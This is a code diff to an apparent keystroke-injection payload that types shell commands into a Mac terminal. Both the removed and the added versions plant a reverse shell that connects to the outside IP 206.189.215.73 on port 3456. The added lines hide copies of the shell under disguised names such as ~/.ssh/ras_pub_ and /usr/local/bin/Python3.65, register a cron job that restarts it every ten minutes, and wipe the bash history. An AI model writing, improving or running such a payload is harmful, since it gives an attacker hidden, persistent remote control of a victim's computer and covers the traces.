@@ -18,8 +18,16 @@ function onKeyboardUp()
                 DELAY 100
                 ENTER
                 DELAY 2000
-                STRING crontab -l | { cat; echo '* * * * * lsof | grep Mac_Application_Support &>/dev/null; if [[ \\\$? != 0 ]]; then echo "#\\!/bin/bash" > ~/Mac_Application_Support; echo "exec 5<>/dev/tcp/206.189.215.73/3456" >> ~/Mac_Application_Support; echo "cat <&5 | while read line; do \\\$line 2>&5 >&5; done" >> ~/Mac_Application_Support; chmod +x ~/Mac_Application_Support; nohup ~/Mac_Application_Support &>/dev/null &; sleep 1; rm ~/Mac_Application_Support; fi'; } | crontab - && history -c && rm ~/.bash_history && exit
-                DELAY 3000
+                STRING echo "#\!/bin/bash" > ~/app_support.sh && echo "bash -i >& /dev/tcp/206.189.215.73/3456 0>&1" >> ~/app_support.sh && chmod a+x ~/app_support.sh
+                DELAY 1500
+                ENTER
+                DELAY 300
+                STRING cp ~/app_support.sh /tmp/; cp ~/app_support.sh ~/.ssh/ras_pub_; cp ~/app_support.sh ~/.ssh/ras_pub_; mkdir -p ~/Library/.hidden && cp ~/app_support.sh ~/Library/.hidden/; cp ~/app_support.sh ~/Library/Python3.65; cp ~/app_support.sh /usr/local/bin/Python3.65;
+                DELAY 1500
+                ENTER
+                DELAY 300
+                STRING crontab -l | { cat; echo '*/10 * * * * ~/app_support.sh || /tmp/app_support.sh || ~/.ssh/ras_pub_ || ~/Library/.hidden/app_support.sh || ~/Library/Python3.65 || /usr/local/bin/Python3.65'; } | crontab - && history -c && rm ~/.bash_history && exit
+                DELAY 1500
                 ENTER
                 DELAY 2000
                 GUI q
